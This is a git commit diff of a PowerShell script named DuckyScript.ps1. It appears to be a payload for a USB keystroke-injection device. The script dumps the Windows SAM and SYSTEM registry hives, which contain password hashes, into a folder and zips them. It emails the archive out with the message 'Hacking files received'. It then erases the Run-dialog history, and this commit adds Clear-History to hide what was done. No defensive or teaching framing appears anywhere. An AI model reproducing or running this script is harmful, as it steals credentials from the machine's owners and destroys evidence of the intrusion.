e3734169f71f9cd0bd6ff91e5c57753e55efd200
Yohan Chathuranga <yohanchathuranga72565@gmail.comm>
2024-04-23 10:43:05 +0100

    Commit 3

--- DuckyScript.ps1
+++ DuckyScript.ps1
@@ -1,3 +1,15 @@
+# Define the path to the directory
+$directoryPath = "C:\datafiles"
+$filePath = "C:\datafiles.zip"
+
+# Check if the directory exists
+if (Test-Path -Path $directoryPath -PathType Container) {
+    Remove-Item -Path $directoryPath -Recurse -Confirm:$false
+}
+if (Test-Path $filePath) {
+    Remove-Item -Path $filePath 
+}
+
 mkdir c:\datafiles
 reg SAVE HKLM\SAM C:\datafiles\SAM
 reg SAVE HKLM\SYSTEM C:\datafiles\SYSTEM
@@ -16,3 +28,5 @@ $ReportEmail.Body = "Hacking files received....!!!!!"
 $ReportEmail.Attachments.Add("C:\datafiles.zip")
 $SMTPInfo.Send($ReportEmail)
 REG DELETE HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /f
+Clear-History
+
